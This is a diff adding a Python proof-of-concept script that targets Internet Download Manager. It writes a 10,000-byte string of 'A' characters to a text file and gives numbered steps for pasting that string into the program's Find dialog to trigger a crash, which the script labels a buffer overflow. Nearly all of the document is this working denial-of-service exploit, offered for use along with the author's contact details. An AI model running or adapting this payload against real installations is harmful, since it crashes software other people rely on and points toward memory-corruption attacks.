@@ -1,0 +1,31 @@
+#!/⁠usr/⁠bin/⁠env python
+# Title : Internet Download Manager -⁠ Crash Proof Of Concept
+# Affected Versions: All Version
+# Founder : InternetDownloadManager
+# Tested on Windows 7 /⁠ Server 2008
+#
+#
+# Author      :   Mohammad Reza Espargham
+# Linkedin    :   https://ir.linkedin.com/in/rezasp
+# E-⁠Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
+# Website     :   www.reza.es
+# Twitter     :   https://twitter.com/rezesp
+# FaceBook    :   https://www.facebook.com/mohammadreza.espargham
+#
+#
+# downlWithIDM64.dll Exploit
+#
+#
+# 1 . run python code : python crash.py
+# 2 . open r3z4.txt and copy content to clipboard
+# 3 . open "IDM"
+# 4 . From Menu , Downloads -⁠-⁠> Find
+# 5 . Paste ClipBoard on "File name or part of the name"
+# 6 . Click Find
+# 7 . Crashed ;)
+
+
+crash = "\x41"*10000 #B0F
+file = open("r3z4.txt", "w")
+file.write(crash)
+file.close()
